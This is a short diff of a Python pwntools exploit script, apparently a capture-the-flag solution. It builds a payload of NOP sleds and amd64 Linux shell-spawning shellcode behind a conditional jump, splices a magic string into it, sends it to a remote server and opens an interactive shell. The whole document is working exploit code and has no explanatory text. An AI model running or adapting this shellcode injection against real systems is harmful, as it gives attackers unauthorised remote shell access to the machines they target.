@@ -11,16 +11,14 @@ print(server.recvuntil('yours?')) # 0x006010a0
 payload = ''
 payload += asm('''
   jnz sc
-  {}
+  {0}
 sc:
-  nop
-  '''.format('nop\n'*33) + shellcraft.amd64.linux.sh())
-print(payload)
+  {1}
+  {2}
+  '''.format('nop\n'*34, shellcraft.amd64.linux.sh(), 'nop\n'*34))
+
 payload = payload[:2] + 'wubbalubbadubdub' + payload[2:]
 print(payload)
-#payload += asm('jnz 0x6010c0')
-#payload += 'wubbalubbadubdub'
-#payload += shellcode
 server.send(payload)
 
 server.interactive()
